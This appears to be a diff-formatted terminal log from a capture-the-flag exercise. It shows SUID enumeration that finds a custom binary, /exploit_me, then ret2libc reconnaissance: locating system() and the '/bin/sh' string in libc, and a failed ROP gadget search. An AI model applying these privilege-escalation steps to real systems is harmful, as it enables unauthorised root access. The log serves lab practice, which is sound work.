+127.0.1.1       hydra
+127.0.0.1       localhost ip6-localhost ip6-loopback
+zeeshan@hydra:~$ find / -perm -u+s 2>/dev/null
+/exploit_me
+/bin/mount
+/bin/umount
+/bin/ping
+/bin/fusermount
+/bin/ping6
+/bin/su
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/snapd/snap-confine
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/bin/newgrp
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/newuidmap
+/usr/bin/at
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/newgidmap
+/usr/bin/passwd
+zeeshan@hydra:~$ 
+
+
+
+root@ip-10-81-91-142:~/Obscure# chmod 777 exploit_me
+root@ip-10-81-91-142:~/Obscure# file exploit_me
+exploit_me: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=589ddc7b680c9a773ae64cc2db0e877b490e943e, not stripped
+root@ip-10-81-91-142:~/Obscure# ldd /exploit_me
+ldd: /exploit_me: No such file or directory
+root@ip-10-81-91-142:~/Obscure# ldd exploit_me
+	linux-vdso.so.1 (0x00007ffc47706000)
+	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4772e06000)
+	/lib64/ld-linux-x86-64.so.2 (0x00007f4773017000)
+root@ip-10-81-91-142:~/Obscure# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
+   237: 0000000000153d00   103 FUNC    GLOBAL DEFAULT   15 svcerr_systemerr@@GLIBC_2.2.5
+   619: 0000000000052290    45 FUNC    GLOBAL DEFAULT   15 __libc_system@@GLIBC_PRIVATE
+  1430: 0000000000052290    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5
+root@ip-10-81-91-142:~/Obscure# strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep '/bin/sh'
+ 1b45bd /bin/sh
+root@ip-10-81-91-142:~/Obscure# ROGadget --binary exploit_me | grep 'pop rdi'
+ROGadget: command not found
+root@ip-10-81-91-142:~/Obscure# ROGadget
+ROGadget: command not found
+root@ip-10-81-91-142:~/Obscure# 
+
+
+
+
+
 
